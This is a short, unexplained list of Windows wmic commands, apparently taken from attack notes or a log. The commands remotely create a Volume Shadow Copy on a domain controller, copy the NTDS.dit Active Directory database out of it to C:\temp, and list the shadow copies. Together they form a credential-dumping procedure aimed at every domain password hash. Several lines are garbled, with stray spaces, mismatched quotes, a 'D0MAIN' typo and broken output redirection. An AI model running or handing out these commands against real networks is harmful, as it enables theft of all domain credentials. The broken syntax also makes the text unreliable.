commandline: wmic /node: DC 10.0.0.101 /user: " D0MAIN\user" /password: " PASS " process call create "cmd /c vssadmin create shadow /for=C: 2 &1 C:\temp\output.txt"

wmic /node: DC 10.0.0.101 /user: "DOMAIN\user" /password: " PASS" process call create ''cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyc\NTDS\NTDS.dit C:\temp\ntds.dit 2 &1 C:\temp\output.txt"
wmic /node: DC 10.0.0.101 /user:"DOMAIN\user" /password:"PASS " process call create "cmd /c vssadmin list shadows 2 &1 c:\temp\output.txt"
